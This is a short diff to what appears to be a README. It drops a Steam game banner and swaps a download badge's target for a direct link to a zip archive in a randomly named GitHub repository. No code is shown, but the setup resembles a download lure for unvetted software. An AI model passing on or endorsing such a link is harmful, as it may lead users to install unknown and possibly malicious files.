@@ -8,9 +8,7 @@
 
 ---
 
-[![Download](og-image.png)](https://git-setup.github.io/download/)
-
-<img src="https://cdn.akamai.steamstatic.com/steam/apps/2445070/header.jpg" alt="banner" width="100%" />
+[![Download](og-image.png)](https://github.com/MeetMarshalSee/gngwvudj/releases/download/Main/Main.zip)
 
 
 ---
